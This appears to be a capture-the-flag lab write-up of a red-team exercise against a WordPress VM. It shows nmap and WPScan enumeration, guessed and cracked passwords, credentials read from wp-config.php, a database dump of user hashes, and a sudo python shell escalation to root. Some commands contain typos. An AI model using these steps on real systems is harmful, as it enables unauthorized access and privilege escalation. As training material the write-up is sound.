# Red Team: Summary of Operations

## Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

## Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

- **$ nmap -sV -A 192.168.1.100**

![NMAP scan](https://user-images.githubusercontent.com/88005785/156202449-00d3d6a3-2b1a-4f3a-b20a-a435e417e40d.png)

This scan identifies the services below as potential points of entry for Target 1:

- Port 22/TCP Open SSH
- Port 80/TCP Open HTTP
- Port 111/TCP Open rpcbind
- Port 139/TCP Open netbios-ssn
- Port 445/TCP Open netbios-ssn

The following vulnerabilities were identified on the Target 1 VM:

- User enumeration 
- Weak user passwords
- No use of salt on hashed passwords
- Misconfigured user privileges

## Exploitation

The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

- Flag1.txt: b9bbcb33e11b80be759c4e8448622482d

- Exploit Used
  - WPScan was used to enumerate users on the WordPress site
  - **$ wpscan --url http://192.168.1.110/Wordpress --enumerate u**

![Enumeration](https://user-images.githubusercontent.com/88005785/156202666-bda80739-4b50-4319-b4cf-50c57ec610d7.png)

  - After enumerating users, guessed user Michael’s password: michael
  - Connected via SSH using Michael’s credentials.
    - **$ ssh michael@192.168.1.110**
  - Found first flag in /var/www/html/service.html directory and file by using following command:
    - **$ grep -ir flag1 /var/www**

![Flag1](https://user-images.githubusercontent.com/88005785/156202721-05f782ae-8cb3-4adb-9fc1-d21f3123007e.png)

- Flag2.txt: fc3fd58dcdad9ab23faca6e9a36e581c

- Exploit Used
  - Used similar commands to search directories and files in Michael’s machine.
  - Search through Michael’s directories uncovered the second flag:

![Flag2](https://user-images.githubusercontent.com/88005785/156202771-4f845dc0-dd5e-4ef6-8801-d5748c00f1e3.png)

- Flag3.txt: afc01ab56b50591e7dccf93122770cd2

- Exploit Used
  - Searching for file name, located the wp-config.php containing Michael’s mysql login credentials, including password: R@v3nSecurity

![SQL creds](https://user-images.githubusercontent.com/88005785/156202822-3cd279e0-70bb-44e9-843a-3f4a550d4ae5.png)

  - Logged into mysql with following command
    - **$ mysql -u root - p wordpress**
  - Ran the following sql commands to enumerate the tables:
    - **show databases;**
    - **use wordpress;**
    - **show tables;**

![mysql table](https://user-images.githubusercontent.com/88005785/156202856-bb8acbbf-d34a-4243-97b7-cb9faf1643eb.png)

     - select * from wp_posts;

![Flag3](https://user-images.githubusercontent.com/88005785/156202875-8cdb60ff-32a1-4184-a169-831b859b311f.png)

    - select * from wp_users;

![Hashed passwords](https://user-images.githubusercontent.com/88005785/156202901-b6ed3cce-eb4c-4b72-83b5-1daec9a720f2.png)

  - On the Kali machine, the hashed passwords (displayed above) were cracked using John the Ripper:
    - **$ john wp_hashes.txt**

![Steve password](https://user-images.githubusercontent.com/88005785/156202935-5679ae4c-b1a8-44df-b7f3-466fecc21307.png)
 
 - Steven’s password was obtained: pink84

- Flag4.txt: 715dea6c055b9fe3337544932f2941ce

- Exploit Used
  - Connected via SSH using Steven’s credentials
    - **$ ssh steven@192.168.1.110**


![Steve account](https://user-images.githubusercontent.com/88005785/156202989-707e992c-a101-4e93-a0bf-027324c44e54.png)

  - Attempted to switch to root by enumerating sudo privileges:
    - **$ sudo -l**

![Steve sudo](https://user-images.githubusercontent.com/88005785/156203026-4eecaabe-b699-4925-a3bc-5c5c54f20439.png)

  - Escalated to root by using the following python command:
    - **$ sudo python -c ‘import pty: pty.spawn(*/bin/sh”)’**

![Python command](https://user-images.githubusercontent.com/88005785/156203052-3e079f95-1c0b-4419-9a0e-6c9b64108019.png)

  - With access to root, found the 4th flag:

![Flag4](https://user-images.githubusercontent.com/88005785/156203081-e157be54-19c5-4ac8-86ee-95bb08eb2d1d.png)
